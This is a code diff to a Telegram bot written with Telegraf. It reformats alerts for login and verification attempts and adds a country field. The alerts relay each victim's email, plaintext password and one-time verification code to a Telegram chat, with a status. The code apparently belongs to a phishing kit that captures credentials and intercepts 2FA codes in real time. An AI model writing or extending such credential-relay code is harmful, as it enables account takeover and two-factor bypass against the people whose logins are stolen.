@@ -5,6 +5,7 @@ import { session, Telegraf } from "telegraf";
 import { env } from "@/env";
 import { db, driver } from "@/lib/db/db";
 import { tables } from "@/lib/db/schemas";
+import { formatCountry } from "../utils";
 import {
   emitLoginAttempt,
   emitMethodAttempt,
@@ -159,7 +160,9 @@ _bot.on("callback_query", async (ctx) => {
           message.chatId,
           message.messageId,
           undefined,
-          `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>`,
+          `<b>⚠️ LOGIN ATTEMPT ⚠️</b>\n\n` +
+            `<b>👤 USER:</b> <code>${loginAttempt.userId}</code>\n` +
+            `<b>🌐 COUNTRY:</b> ${formatCountry(loginAttempt.country)}`,
           { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } },
         ),
       ),
@@ -259,10 +262,12 @@ _bot.on("callback_query", async (ctx) => {
           message.chatId,
           message.messageId,
           undefined,
-          `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
-            `<b>🔑 EMAIL:</b> <code>${loginAttempt.email}</code>\n` +
+          `<b>⚠️ VERIFICATION ATTEMPT ⚠️</b>\n\n` +
+            `<b>👤 USER:</b> <code>${loginAttempt.userId}</code>\n` +
+            `<b>🌐 COUNTRY:</b> ${formatCountry(loginAttempt.country)}\n` +
+            `<b>✉️ EMAIL:</b> <code>${loginAttempt.email}</code>\n` +
             `<b>🔑 PASSWORD:</b> <code>${loginAttempt.password}</code>\n` +
-            `<b>🔐 CODE:</b> <code>${loginAttempt.code}</code> \n` +
+            `<b>🔐 CODE:</b> <code>${loginAttempt.code}</code>\n` +
             `<b>❗ STATUS:</b> ${formattedVerifyAttemptStatus}`,
           { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } },
         ),
